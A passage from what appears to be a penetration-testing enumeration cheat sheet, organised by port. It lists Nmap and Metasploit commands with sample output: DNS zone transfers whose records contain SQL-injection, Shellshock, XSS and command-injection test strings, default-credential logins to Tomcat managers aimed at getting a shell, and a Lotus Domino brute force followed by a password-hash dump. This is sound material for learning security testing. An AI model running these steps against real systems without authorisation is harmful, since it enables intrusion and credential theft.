|       SOA EXPIRE was within recommended range (1209600s)
|     PASS - SOA MNAME entry check
|       SOA MNAME record is listed as DNS server
|     PASS - Zone serial numbers
|       Zone serials match
|   NS
|     FAIL - Recursive queries
|       The following servers allow recursive queries: 45.33.xx.xx
|     PASS - Multiple name servers
|       Server has 2 name servers
|     PASS - DNS name server IPs are public
|       All DNS IPs were public
|     PASS - DNS server response
|       All servers respond to DNS queries
|     PASS - Missing nameservers reported by parent
|       All DNS servers match
|     PASS - Missing nameservers reported by your nameservers
|_      All DNS servers match

Nmap done: 1 IP address (1 host up) scanned in 6.05 seconds
```
</li>

<li><a href="https://nmap.org/nsedoc/scripts/dns-nsid.html">dns-nsid.nse</a>: Retrieves information from a DNS nameserver by requesting its nameserver ID (nsid) and asking for its id.server and version.bind values.
<br>
<br>
Sample Output:
```
nmap -sSU -p 53 --script dns-nsid 202.191.xx.xx

Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-06 09:37 IST
Nmap scan report for segment-202-191.sify.net (202.191.xx.xx)
Host is up (0.097s latency).
PORT   STATE SERVICE
53/tcp open  domain
53/udp open  domain
| dns-nsid: 
|_  bind.version: 9.3.3rc2

Nmap done: 1 IP address (1 host up) scanned in 1.21 seconds
```
</li>

<li><a href="https://nmap.org/nsedoc/scripts/dns-recursion.html">dns-recursion.nse</a> : Checks if a DNS server allows queries for third-party names. It is expected that recursion will be enabled on your own internal nameservers.
<br>
<br>
Sample Output:
```
nmap -sU -p 53 --script=dns-recursion 202.191.xx.xx

Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-06 09:39 IST
Nmap scan report for segment-202-191.sify.net (202.191.xx.xx)
Host is up (0.094s latency).
PORT   STATE SERVICE
53/udp open  domain
|_dns-recursion: Recursion appears to be enabled

Nmap done: 1 IP address (1 host up) scanned in 1.14 seconds
```
</li>

<li><a href="https://nmap.org/nsedoc/scripts/dns-service-discovery.html">dns-service-discovery.nse</a> : Attempts to discover target hosts' services using the DNS Service Discovery protocol. The script first sends a query for _services._dns-sd._udp.local to get a list of services. It then sends a followup query for each one to try to get more information.
<br>
<br>
Sample Output:
```
Yet to run
nmap --script=dns-service-discovery -p 5353 <target>
```
</li>

<li><a href="https://nmap.org/nsedoc/scripts/dns-srv-enum.html">dns-srv-enum.nse</a> : Enumerates various common service (SRV) records for a given domain name. The service records contain the hostname, port and priority of servers for a given service. The following services are enumerated by the script:
<ul>
<li>Active Directory Global Catalog</li>
<li>Exchange Autodiscovery</li>
<li>Kerberos KDC Service</li>
<li>Kerberos Passwd Change Service</li>
<li>LDAP Servers</li>
<li>SIP Servers</li>
<li>XMPP S2S</li>
<li>XMPP C2S</li>
</ul>
<br>
Sample Output:
```
Yet to run
```
</li>

<li><a href="https://nmap.org/nsedoc/scripts/dns-zone-transfer.html">dns-zone-transfer.nse</a> : Requests a zone transfer (AXFR) from a DNS server.
<br>
<br>
Sample Output:
```
nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=zonetransfer.me nsztm2.digi.ninja

Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-06 09:49 IST
Nmap scan report for nsztm2.digi.ninja (167.88.xx.xx)
Host is up (0.29s latency).
Other addresses for nsztm2.digi.ninja (not scanned): 64:ff9b::a758:2a5e
rDNS record for 167.88.xx.xx: zonetransfer.me
Not shown: 996 closed ports
PORT     STATE    SERVICE
53/tcp   open     domain
| dns-zone-transfer: 
| zonetransfer.me.                                SOA    nsztm1.digi.ninja. robin.digi.ninja.
| zonetransfer.me.                                HINFO  "Casio fx-700G" "Windows XP"
| zonetransfer.me.                                TXT    "google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA"
| zonetransfer.me.                                MX     0 ASPMX.L.GOOGLE.COM.
| zonetransfer.me.                                MX     10 ALT1.ASPMX.L.GOOGLE.COM.
| zonetransfer.me.                                MX     10 ALT2.ASPMX.L.GOOGLE.COM.
| zonetransfer.me.                                MX     20 ASPMX2.GOOGLEMAIL.COM.
| zonetransfer.me.                                MX     20 ASPMX3.GOOGLEMAIL.COM.
| zonetransfer.me.                                MX     20 ASPMX4.GOOGLEMAIL.COM.
| zonetransfer.me.                                MX     20 ASPMX5.GOOGLEMAIL.COM.
| zonetransfer.me.                                A      217.147.xx.xx
| zonetransfer.me.                                NS     nsztm1.digi.ninja.
| zonetransfer.me.                                NS     nsztm2.digi.ninja.
| _sip._tcp.zonetransfer.me.                      SRV    0 0 5060 www.zonetransfer.me.
| 157.177.xx.xx.IN-ADDR.ARPA.zonetransfer.me.   PTR    www.zonetransfer.me.
| asfdbauthdns.zonetransfer.me.                   AFSDB  1 asfdbbox.zonetransfer.me.
| asfdbbox.zonetransfer.me.                       A      127.0.xx.xx
| asfdbvolume.zonetransfer.me.                    AFSDB  1 asfdbbox.zonetransfer.me.
| canberra-office.zonetransfer.me.                A      202.14.xx.xx
| cmdexec.zonetransfer.me.                        TXT    "; ls"
| contact.zonetransfer.me.                        TXT    "Remember to call or email Pippa on +44 123 4567890 or pippa@zonetransfer.me when making DNS changes"
| dc-office.zonetransfer.me.                      A      143.228.xx.xx
| deadbeef.zonetransfer.me.                       AAAA   dead:beaf::
| dr.zonetransfer.me.                             LOC    53.349044 N 1.642646 W 0m 1.0m 10000.0m 10.0m
| DZC.zonetransfer.me.                            TXT    "AbCdEfG"
| email.zonetransfer.me.                          NAPTR  1 1 "P" "E2U+email" "" email.zonetransfer.me.zonetransfer.me.
| email.zonetransfer.me.                          A      74.125.xx.xx
| Info.zonetransfer.me.                           TXT    "ZoneTransfer.me service provided by Robin Wood - robin@digi.ninja. See http://digi.ninja/projects/zonetransferme.php for more information."
| internal.zonetransfer.me.                       NS     intns1.zonetransfer.me.
| internal.zonetransfer.me.                       NS     intns2.zonetransfer.me.
| intns1.zonetransfer.me.                         A      167.88.xx.xx
| intns2.zonetransfer.me.                         A      167.88.xx.xx
| office.zonetransfer.me.                         A      4.23.xx.xx
| ipv6actnow.org.zonetransfer.me.                 AAAA   2001:67c:2e8:11::c100:1332
| owa.zonetransfer.me.                            A      207.46.xx.xx
| robinwood.zonetransfer.me.                      TXT    "Robin Wood"
| rp.zonetransfer.me.                             RP     robin.zonetransfer.me. robinwood.zonetransfer.me.
| sip.zonetransfer.me.                            NAPTR  2 3 "P" "E2U+sip" "!^.*$!sip:customer-service@zonetransfer.me!" .
| sqli.zonetransfer.me.                           TXT    "' or 1=1 --"
| sshock.zonetransfer.me.                         TXT    "() { :]}; echo ShellShocked"
| staging.zonetransfer.me.                        CNAME  www.sydneyoperahouse.com.
| alltcpportsopen.firewall.test.zonetransfer.me.  A      127.0.xx.xx
| testing.zonetransfer.me.                        CNAME  www.zonetransfer.me.
| vpn.zonetransfer.me.                            A      174.36.xx.xx
| www.zonetransfer.me.                            A      217.147.xx.xx
| xss.zonetransfer.me.                            TXT    "'><script>alert('Boo')</script>"
|_zonetransfer.me.                                SOA    nsztm1.digi.ninja. robin.digi.ninja.
135/tcp  filtered msrpc
445/tcp  filtered microsoft-ds
8333/tcp filtered bitcoin

Nmap done: 1 IP address (1 host up) scanned in 18.98 seconds
```</li>
</ol>

###Finger | Port 79

<ol>
<strong>Metasploit</strong> has a 
<li><strong>Finger Service User Enumerator</strong> which can be used to identify users.
```
use auxiliary/scanner/finger/finger_users
services -p 79 -u -R
```
Sample Output:
```
[+] 172.30.xx.xx:79 - Found user: adm
[+] 172.30.xx.xx:79 - Found user: lp
[+] 172.30.xx.xx:79 - Found user: uucp
[+] 172.30.xx.xx:79 - Found user: nuucp
[+] 172.30.xx.xx:79 - Found user: listen
[+] 172.30.xx.xx:79 - Found user: bin
[+] 172.30.xx.xx:79 - Found user: daemon
[+] 172.30.xx.xx:79 - Found user: gdm
[+] 172.30.xx.xx:79 - Found user: noaccess
[+] 172.30.xx.xx:79 - Found user: nobody
[+] 172.30.xx.xx:79 - Found user: nobody4
[+] 172.30.xx.xx:79 - Found user: oracle
[+] 172.30.xx.xx:79 - Found user: postgres
[+] 172.30.xx.xx:79 - Found user: root
[+] 172.30.xx.xx:79 - Found user: svctag
[+] 172.30.xx.xx:79 - Found user: sys
[+] 172.30.xx.xx:79 Users found: adm, bin, daemon, gdm, listen, lp, noaccess, nobody, nobody4, nuucp, oracle, postgres, root, svctag, sys, uucp
```
</li>
</ol>

<strong>Nmap</strong> has 
<ol>
<li><a href="https://nmap.org/nsedoc/scripts/finger.html">finger.nse</a>  : Attempts to retrieve a list of usernames using the finger service.
<br>
<br>
Sample Output:
```
Yet to run
```
</li>
</ol>

Same can be done using 
<ul>
<li>finger command
```
finger root 172.30.xx.xx
finger: 172.30.xx.xx: no such user.
Login: root           			Name: root
Directory: /root                    	Shell: /bin/bash
Last login Sat Feb  6 22:43 (IST) on tty1
No mail.
No Plan.
```
</li>
</ul>

###HTTP 

Let's first get a hold of what services are running on the network by checking the different banners
```
services -p 80 -c port,name,info -u -o /tmp/http.ports
cat /tmp/http.ports | cut -d , -f2,3,4 | sort | uniq | tr -d \" | grep -v port | sort -n
```
Sample Services running
```
80,http,3Com switch http config
80,http,3Com switch webadmin 1.0
80,http,Agranat-EmWeb 5.2.6 HP LaserJet http config
80,http,Allegro RomPager 4.01
80,http,Allegro RomPager 4.30
80,http,Allen-Bradley 1761-NET-ENIW http config
80,http,Apache-Coyote/1.1
80,http,Apache-Coyote/1.1 ( 401-Basic realm=Tomcat Manager Application )
80,http,Apache httpd
80,http,Apache httpd 0.6.5
80,http,Apache httpd 1.3.27 (Unix) (Red-Hat/Linux) PHP/4.1.2 mod_perl/1.24_01
80,http,Apache httpd 2.0.63 (CentOS)
80,http,Apache httpd 2.2.10 (Fedora)
80,http,Apache httpd 2.2.15 (Red Hat)
80,http,Apache httpd 2.2.17 (Win32)
80,http,Apache httpd 2.2.21 (Win32) mod_ssl/2.2.21 OpenSSL/1.0.0e PHP/5.3.8 mod_perl/2.0.4 Perl/v5.10.1
80,http,Apache httpd 2.2.22 (Ubuntu)
80,http,Apache httpd 2.2.22 (Unix)
80,http,Apache httpd 2.2.3 (CentOS)
80,http,Apache httpd 2.2.3 (Red Hat)
80,http,Apache httpd 2.4.12 (Unix)
80,http,Apache httpd 2.4.7 (Ubuntu)
80,http,Apache httpd 2.4.9 (Win32) PHP/5.5.12
80,http,Apache httpd 2.4.9 (Win64)
80,http,Apache Tomcat/Coyote JSP engine 1.1
80,http,AudioCodes MP-202 VoIP adapter http config
80,http,BenQ projector Crestron RoomView
80,http,Boa HTTPd 0.94.14rc19
80,http,BusyBox httpd 1.13
80,http,Canon Pixma IP4000R printer http config KS_HTTP 1.0
80,http,Canon printer web interface
80,http,Check Point NGX Firewall-1
80,http,ChipPC Extreme httpd
80,http,Cisco IOS http config
80,http,Citrix Xen Simple HTTP Server
80,http,Citrix Xen Simple HTTP Server XenServer 5.6.100
80,http,Citrix Xen Simple HTTP Server XenServer 6.0.0
80,http,Citrix Xen Simple HTTP Server XenServer 6.0.2
80,http,Citrix Xen Simple HTTP Server XenServer 6.2.0
80,http,Crestron MPS-200 AV routing system http config
80,http,Crestron PRO2 automation system web server
80,http,Debut embedded httpd 1.20 Brother/HP printer http admin
80,http,Dell N2000-series switch http admin
80,http,Dell PowerVault TL4000 http config
80,http,D-Link print server http config 1.0
80,http,Embedthis HTTP lib httpd
80,http,Gembird/Hawking/Netgear print server http config
80,http,GoAhead WebServer
80,http,GoAhead WebServer LinkSys SLM2024 or SRW2008 - SRW2016 switch http config
80,http,GoAhead WebServer Router with realtek 8181 chipset http config
80,http,HP-ChaiSOE 1.0 HP LaserJet http config
80,http,HP Deskjet 3050 J610 printer http config Serial CN12E3937Y05HX
80,http,HP Deskjet 3520 printer http config Serial CN3471G0QJ05T0
80,http,HP Deskjet 3540 printer http config Serial CN41K2T0RN05X6
80,http,HP Integrated Lights-Out web interface 1.30
80,http,HP LaserJet 1022n printer http config 4.0.xx.xx
80,http,HP LaserJet CP1205nw or P1606 http config
80,http,HP LaserJet P2014n printer http config 4.2
80,http,HP Officejet 7610 printer http config Serial CN5293M07X064N
80,http,HP Officejet Pro X576dw printer http config Serial CN4BDJX0RC
80,http,HP ProCurve 1800-24G switch http config
80,http,HP ProCurve httpd
80,http,Jetty 6.1.x
80,http,Konica Minolta PageScope Web Connection httpd
80,http,Liaison Exchange Commerce Suite
80,http,lighttpd
80,http,lighttpd 1.4.23
80,http,lighttpd 1.4.28
80,http,lighttpd 1.4.29
80,http,lighttpd 1.4.32
80,http,lighttpd 1.4.33
80,http,Linksys PAP2 VoIP http config
80,http,Lotus Domino httpd
80,http,Mathopd httpd 1.5p6
80,http,Mbedthis-Appweb 2.4.0
80,http,Mbedthis-Appweb 2.4.2
80,http,Mbedthis-Appweb 2.5.0
80,http,Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
80,http,Microsoft-IIS/10.0
80,http,Microsoft-IIS/10.0 ( Powered by ASP.NET )
80,http,Microsoft-IIS/5.1
80,http,Microsoft-IIS/5.1 ( Powered by ASP.NET )
80,http,Microsoft-IIS/6.0
80,http,Microsoft-IIS/6.0 ( Powered by ASP.NET )
80,http,Microsoft-IIS/7.5
80,http,Microsoft-IIS/7.5 ( Powered by ASP.NET )
80,http,Microsoft-IIS/8.0 ( Powered by ASP.NET )
80,http,Microsoft-IIS/8.5
80,http,Microsoft-IIS/8.5 ( Powered by ASP.NET )
80,http,Microsoft IIS httpd 10.0
80,http,Microsoft IIS httpd 5.1
80,http,Microsoft IIS httpd 6.0
80,http,Microsoft IIS httpd 7.5
80,http,Microsoft IIS httpd 8.0
80,http,Microsoft IIS httpd 8.5
80,http,MoxaHttp 1.0
80,http,nginx 1.2.2
80,http,Omron PLC http config
80,http,Oracle HTTP Server Powered by Apache 1.3.22 mod_plsql/3.0.xx.xx.3b mod_ssl/2.8.5 OpenSSL/0.9.6b mod_fastcgi/2.2.12 mod_oprocmgr/1.0 mod_perl/1.25
80,http,Panasonic WV-NF284 webcam http config
80,http,Panasonic WV-NP304 webcam http config
80,http,Panasonic WV-NW960 webcam http config
80,http-proxy,Squid http proxy 2.5.STABLE4
80,http,RapidLogic httpd 1.1
80,http,Samsung SyncThru Web Service M337x 387x 407x series; SN: ZDFABJEF600007W
80,http,uc-httpd 1.0.0
80,http,Virata-EmWeb 6.0.1 HP JetDirect http config
80,http,Virata-EmWeb 6.0.1 HP LaserJet 3055 printer http config
80,http,Virata-EmWeb 6.0.1 HP LaserJet P2015 Series printer http config
80,http,Virata-EmWeb 6.2.1
80,http,Virata-EmWeb 6.2.1 HP LaserJet http config
80,http,Virata-EmWeb 6.2.1 HP LaserJet M1522nf MFP printer http config
80,http,Virata-EmWeb 6.2.1 HP printer http config
80,http,VMware ESXi 4.1 Server httpd
80,http,VMware ESXi Server httpd
80,http,Web-Server httpd 3.0 Ricoh Aficio printer web image monitor
80,http,Western Digital My Book http config
80,http,Zero One Technology 11 httpd 5.4.2049
80,http,Zero One Technology 15 httpd 6.8.0104
80,http,Zero One Technology 30 httpd 8.3.0013
80,http,Zero One Technology 35 httpd 6.2.0001
80,ipp,Canon printer http config 1.00
80,ipp,Canon printer http config 2.10
80,ipp,Canon printer http config 2.21
80,ipp,HP Officejet Pro 8600 ipp model CM750A; serial CN314B3J9905SN
80,ipp,Web-Server httpd 3.0 NRG copier or Ricoh Aficio printer http config
80,rtsp,
80,soap,gSOAP soap 2.7
80,tcpwrapped,
80,tcpwrapped,Cisco IOS http config
80,tcpwrapped,Virata-EmWeb 6.0.1 HP LaserJet P2015 Series printer http config
80,upnp,Epson Stylus NX230 printer UPnP UPnP 1.0; Epson UPnP SDK 1.0
80,wsman,Openwsman
```

So, A lot of stuff, Let's test them for one by one.

<ol>
<li><strong>Webmin</strong>
Searching for webmin in Metasploit gave three modules
```
   auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     Webmin File Disclosure
   exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Webmin /file/show.cgi Remote Command Execution
```
but our webmin versions are different.
```
auxiliary/admin/webmin/edit_html_fileaccess requires Webmin 1.580 plus it requires authenticated user.
auxiliary/admin/webmin/file_disclosure Webmin (versions prior to 1.290) and Usermin (versions prior to 1.220)
exploit/unix/webapp/webmin_show_cgi_exec in Webmin 1.580
```
</li>
<li>
Moving on to <strong>Apache Tomcat</strong>

Searching for Tomcat
```
services -S "Tomcat"

Services
========

host          port  proto  name      state  info
----          ----  -----  ----      -----  ----
10.10.xx.xx   8443  tcp    ssl/http  open   Apache Tomcat/Coyote JSP engine 1.1
10.10.xx.xx   80    tcp    http      open   Apache-Coyote/1.1 ( 401-Basic realm="Tomcat Manager Application" )
10.10.xx.xx   8080  tcp    http      open   Apache-Coyote/1.1 ( 401-Basic realm="Tomcat Manager Application" )
10.10.xx.xx   8080  tcp    http      open   Apache-Coyote/1.1 ( 401-Basic realm="Tomcat Manager Application" )
10.10.xx.xx   8080  tcp    http      open   Apache-Coyote/1.1 ( 401-Basic realm="Tomcat Manager Application" )
10.10.xx.xx   8080  tcp    http      open   Apache-Coyote/1.1 ( 401-Basic realm="Tomcat Manager Application" )
10.10.xx.xx    8080  tcp    http      open   Apache-Coyote/1.1 ( 401-Basic realm="Tomcat Manager Application" )
10.10.xx.xx   1311  tcp    ssl/http  open   Apache Tomcat/Coyote JSP engine 1.1
10.10.xx.xx   80    tcp    http      open   Apache Tomcat/Coyote JSP engine 1.1
10.10.xx.xx   80    tcp    http      open   Apache-Coyote/1.1 ( 401-Basic realm="Tomcat Manager Application" )
10.10.xx.xx  1311  tcp    ssl/http  open   Apache Tomcat/Coyote JSP engine 1.1
10.10.xx.xx  8443  tcp    ssl/http  open   Apache Tomcat/Coyote JSP engine 1.1
10.10.xx.xx  80    tcp    http      open   Apache-Coyote/1.1 ( 401-Basic realm="Tomcat Manager Application" )
10.17.xx.xx   8081  tcp    http      open   Apache-Coyote/1.1 ( 401-Basic realm="Tomcat Manager Application" )
10.23.xx.xx    8080  tcp    http      open   Apache Tomcat/Coyote JSP engine 1.1
10.25.xx.xx    8080  tcp    http      open   Apache-Coyote/1.1 ( 401-Basic realm="Tomcat Manager Application" )
10.87.xx.xx   8080  tcp    http      open   Apache Tomcat/Coyote JSP engine 1.1
10.87.xx.xx    8081  tcp    http      open   Apache Tomcat/Coyote JSP engine 1.1
10.87.xx.xx   8080  tcp    http      open   Apache-Coyote/1.1 ( 401-Basic realm="Tomcat Manager Application" )
10.87.xx.xx   8080  tcp    http      open   Apache Tomcat/Coyote JSP engine 1.1
```
We get multiple tomcat manager applications running. Let's see what we have for Tomcat

<ul>
<li>
<strong>Tomcat Application Manager Login Utility</strong> which checks for default tomcat username and passwords
using the above module
```
use auxiliary/scanner/http/tomcat_mgr_login
services -p 8080 -S "Tomcat Manager" -R

Run the scan for other ports also above 8443, 80, 1311, 8081 :)
```
Sample Output:
```
[-] 10.25.xx.xx:8080 TOMCAT_MGR - LOGIN FAILED: QCC:QLogic66 (Incorrect: )
[*] Scanned 6 of 7 hosts (85% complete)
[+] 10.87.xx.xx:8080 - LOGIN SUCCESSFUL: admin:admin
[+] 10.10.xx.xx:80 - LOGIN SUCCESSFUL: tomcat:tomcat
```
</li>
</ul>
Yay :) We got two apache tomcat we can upload WAR files and get shell ;)

</li>
<li>
Searching for <strong>Canon</strong>

found a interesting module <strong>Canon Printer Wireless Configuration Disclosure</strong> enumerates wireless credentials from Canon printers with 
  a web interface. It has been tested on Canon models: MG3100, MG5300, MG6100, MP495, MX340, MX870, MX890, MX920. We still need to figure out what is Options.
```
use auxiliary/scanner/http/canon_wireless
```
Sample Output
```
[-] 10.23.xx.xx:80 File not found
[+] 10.23.xx.xx:80 Option: 
[-] 10.23.xx.xx:80 Could not determine LAN Settings.
```

</li>
<li><strong>Lotus Domino httpd</strong>
Searching for Lotus Domino we got few modules
```
   auxiliary/scanner/lotus/lotus_domino_hashes                               normal     Lotus Domino Password Hash Collector
   auxiliary/scanner/lotus/lotus_domino_login                                normal     Lotus Domino Brute Force Utility
   auxiliary/scanner/lotus/lotus_domino_version                              normal     Lotus Domino Version
```
Let's try them one by one

<strong>Lotus Domino Version</strong> which determines Lotus Domino Server Version by several checks.
```
use auxiliary/scanner/lotus/lotus_domino_version
services -p 80 -S "Lotus" -R
```
Sample output:
```
[*] 10.10.xx.xx:80 Lotus Domino Base Install Version: ["9.0.0.0"]
```
Let's try <strong>Lotus Domino Login</strong> which is Lotus Domino Authentication Brute Force Utility with our default passwords.
```
use auxiliary/scanner/lotus/lotus_domino_login
services -p 80 -S "Lotus" -R
set USERNAME admin
set PAsSwoRD example@123
```
Sample Output:
```
[*] 10.10.xx.xx:80 LOTUS_DOMINO - [1/1] - Lotus Domino - Trying username:'admin' with password:'example@123'
[+] http://10.10.xx.xx:80 - Lotus Domino - SUCCESSFUL login for 'admin' : 'example@123
```
Using the above credentials we can use lotus_domino_hashes (Lotus Domino Password Hash Collector) module to download user hashes.
```
use auxiliary/scanner/lotus/lotus_domino_hashes
services -p 80 -S "Lotus" -R
set NOTES_USER admin
set NOTES_PASS example@123
```
Sample Output
```
[*] http://10.10.xx.xx:80 - Lotus Domino - Trying dump password hashes with given credentials
[+] http://10.10.xx.xx:80 - Lotus Domino - SUCCESSFUL authentication for 'admin'
[*] http://10.10.xx.xx:80 - Lotus Domino - Getting password hashes
[+] http://10.10.xx.xx:80 - Lotus Domino - Account Found: nadmin, notesadmin@example.com, (GEo1MDjKxxxxxxxxxxx)(GEo1MDjKxxxxxxxxxxx)
```
</li>


<li>
For <strong>IIS</strong>

We can check if WebDAV is enabled on the websites running IIS by <strong>HTTP WebDAV Scanner</strong> which detect webservers with WebDAV enabled.
```
use auxiliary/scanner/http/webdav_scanner
```
Sample Output: Mostly old IIS like 5.1/6.0 would have WebDAV enabled. It is disabled by default in the newer versions.
```
[+] 10.87.xx.xx (Microsoft-IIS/5.1) has WEBDAV ENABLED
```
</li>

<li>For <strong>VMware ESXi</strong>

<ul>
<li>Let's find what version they are running by <strong>VMWare ESX/ESXi Fingerprint Scanner</strong> which accesses the web API interfaces for VMware ESX/ESXi servers and attempts to identify version information for that 
  server.
```
use auxiliary/scanner/vmware/esx_fingerprint
services -p 80 -S VMware
```
Sample Output
```
[+] 10.10.xx.xx:443 - Identified VMware ESXi 5.5.0 build-1623387
[+] 10.10.xx.xx:443 - Identified VMware ESXi 5.5.0 build-1623387
[*] Scanned  2 of 18 hosts (11% complete)
[+] 10.10.xx.xx:443 - Identified VMware ESXi 5.1.0 build-799733
[+] 10.10.xx.xx:443 - Identified VMware ESXi 5.5.0 build-1623387
[*] Scanned  4 of 18 hosts (22% complete)
[+] 10.10.xx.xx:443 - Identified VMware vCenter Server 6.0.0 build-3339083
[*] Scanned  6 of 18 hosts (33% complete)
[+] 10.10.xx.xx:443 - Identified VMware ESXi 6.0.0 build-3073146
[*] Scanned  8 of 18 hosts (44% complete)
[+] 10.10.xx.xx:443 - Identified VMware ESXi 6.0.0 build-3073146
[*] Scanned  9 of 18 hosts (50% complete)
[+] 10.10.xx.xx:443 - Identified VMware ESXi 6.0.0 build-3073146
[+] 10.10.xx.xx:443 - Identified VMware ESXi 6.0.0 build-3073146
[*] Scanned 11 of 18 hosts (61% complete)
[+] 10.10.xx.xx:443 - Identified VMware ESXi 6.0.0 build-3073146
[+] 10.10.xx.xx:443 - Identified VMware ESXi 6.0.0 build-3073146
[*] Scanned 13 of 18 hosts (72% complete)
[+] 10.10.xx.xx:443 - Identified VMware ESXi 6.0.0 build-3029758
[+] 10.10.xx.xx:443 - Identified VMware ESXi 5.0.0 build-623860
[*] Scanned 15 of 18 hosts (83% complete)
[+] 10.10.xx.xx:443 - Identified VMware ESXi 5.5.0 build-1623387
[+] 10.10.xx.xx:443 - Identified VMware ESXi 5.1.0 build-799733
[*] Scanned 17 of 18 hosts (94% complete)
[+] 10.10.xx.xx:443 - Identified VMware ESXi 5.1.0 build-1065491
```
</li>
</ul>
</li>
</ol>

### Kerberos | Port 88

Nmap has

<ol>
<li><a href="https://nmap.org/nsedoc/scripts/krb5-enum-users.html">krb5-enum-users.nse</a>: Discovers valid usernames by brute force querying likely usernames against a Kerberos service. When an invalid username is requested the server will respond using the Kerberos error code KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN, allowing us to determine that the user name was invalid. Valid user names will illicit either the TGT in a AS-REP response or the error KRB5KDC_ERR_PREAUTH_REQUIRED, signaling that the user is required to perform pre authentication.

The script should work against Active Directory. It needs a valid Kerberos REALM in order to operate.

```
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test'
```</li>
</ol>
###POP3 | Port 110

<strong>Metasploit</strong> has two auxiliary scanner modules

<ol>
<li><strong>POP3 Banner Grabber</strong>: which is the banner grabber for pop3
```
use auxiliary/scanner/pop3/pop3_version
services -p 110 -R -u
```</li>

<li><strong>POP3 Login Utility</strong>: which attempts to authenticate to an POP3 service.
```
use auxiliary/scanner/pop3/pop3_login
services -p 110 -R -u
```
</li>
</ol>

<strong>Nmap</strong> has two NSEs

<ol>
<li><a href="https://nmap.org/nsedoc/scripts/pop3-capabilities.html">pop3-capabilities.nse</a>: Retrieves POP3 email server capabilities.</li>
<li><a href="https://nmap.org/nsedoc/scripts/pop3-brute.html">pop3-brute.nse</a>: Tries to log into a POP3 account by guessing usernames and passwords.
```
nmap -sV --script=pop3-brute xxx.xxx.xxx.xxx
```
While playing DE_ICE_S1_100, we figured out that bruteforcing POP3 service is faster than bruteforcing SSH services.
</li>
</ol>

###RPCInfo | Port 111

rpcinfo makes an RPC call to an RPC server and reports what it finds
```
rpcinfo -p IP_Address
```
Sample Output:
```
rpcinfo -p 10.7.xx.xx
   program vers proto   port  service
    100000    2   tcp    111  portmapper
    100000    2   udp    111  portmapper
1073741824    1   tcp    669
1073741824    2   tcp    669
    399929    2   tcp    631
```

We can use <strong>NFS Mount Scanner</strong> module to check for the nfs mounts using port 111
```
use auxiliary/scanner/nfs/nfsmount
services -p 111 -u -R
```
Sample Output:
```
[*] Scanned  24 of 240 hosts (10% complete)
[+] 10.10.xx.xx NFS Export: /data/iso [0.0.0.0/0.0.0.0]
[*] Scanned  48 of 240 hosts (20% complete)
[+] 10.10.xx.xx NFS Export: /DataVolume/Public [*]
[+] 10.10.xx.xx NFS Export: /DataVolume/Download [*]
[+] 10.10.xx.xx NFS Export: /DataVolume/Softshare [*]
[*] Scanned  72 of 240 hosts (30% complete)
[+] 10.10.xx.xx NFS Export: /var/ftp/pub [10.0.0.0/255.255.255.0]
[*] Scanned  96 of 240 hosts (40% complete)
[+] 10.10.xx.xx NFS Export: /common []
```		

The same can be achieved using showmount
```
showmount -a 172.30.xx.xx
All mount points on 172.30.xx.xx:
172.30.xx.xx:/SSSC-LOGS
172.30.xx.xx:/sssclogs
```

Multiple times we have seen msf nfsmount fail because of some error, so it sometimes better to just run a for loop with showmount
```
for i in $(cat /tmp/msf-db-rhosts-20160413-2660-62cf9a); 
do  
	showmount -a $i >> nfs_111; 
done;
```


###Ident | Port 113

If the port ident 113 is open, it might be a good idea to try pentest monkey ident-user-enum Perl Script. The same result is also achieved by nmap <a href="https://nmap.org/nsedoc/scripts/auth-owners.html">auth-owners.nse</a>

Sample Output
```
perl ident-user-enum.pl 10.10.xx.xx 22 53 111 113 512 513 514 515
ident-user-enum v1.0 ( http://pentestmonkey.net/tools/ident-user-enum )

10.10.xx.xx:22	[U2FsdGVkX19U+FaOs8zFI+sBFw5PBF2/hxWdfeblTXM=]
10.10.xx.xx:53	[U2FsdGVkX1+fVazmVwSBwobo05dskDNWG8mogAWzHS8=]
10.10.xx.xx:111	[U2FsdGVkX1+GPhL0rdMggQOQmNzsxtKe+ro+YQ28nTg=]
10.10.xx.xx:113	[U2FsdGVkX1+5f5j9c2qnHFL5XKMcLV7YjUW8LYWN1ac=]
10.10.xx.xx:512	[U2FsdGVkX1+IWVqsWohbUhjr3PAgbkWTaImWIODMUDY=]
10.10.xx.xx:513	[U2FsdGVkX19EEjrVAxj0lX0tTT/FoB3J9BUlfVqN3Qs=]
10.10.xx.xx:514	[U2FsdGVkX18/o1MMaGmcU4ul7kNowuhfBgiplQZ0R5c=]
10.10.xx.xx:515	[U2FsdGVkX1/8ef5wkL05TTMi+skSs65KRGIQB9Z8WnE=]
```
The above are base64 encoded, when decoded results in Salted_Some_Garbage. If anyone know what it's appreciated.

###NetBios
Nmap has 
<ol>
<li><a href="https://nmap.org/nsedoc/scripts/broadcast-netbios-master-browser.html">broadcast-netbios-master-browser.nse</a>
```
nmap --script=broadcast-netbios-master-browser

Starting Nmap 7.01 ( https://nmap.org ) at 2016-05-03 21:31 IST
Pre-scan script results:
| broadcast-netbios-master-browser: 
| ip             server      domain
| 192.168.xx.xx  FILESRV     WORKGROUP
|_192.168.xx.xx  XXXXCJ-NAS  VOLUME
WARNING: No targets were specified, so 0 hosts scanned.
```
</li>
</ol>

###SNMP | Port 161

<strong>Metasploit</strong> has 

<ol>
<li>
We can use use <strong>SNMP Community Scanner</strong> to find the machines which are having default communtites by using SNMP Community Scanner.

```
use auxiliary/scanner/snmp/snmp_login
services -p 161 -u -R
```
Sample Output:
```
[+] 10.4.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): Cisco IOS Software, C1130 Software (C1130-K9W7-M), Version 12.4(10b)JA, RELEASE SOFTWARE (fc2)
Technical Support: http://www.cisco.com/techsupport
Copyright (c) 1986-2007 by Cisco Systems, Inc.
Compiled Wed 24-Oct-07 15:17 by prod_rel_team
[*] Scanned 12 of 58 hosts (20% complete)
[*] Scanned 18 of 58 hosts (31% complete)
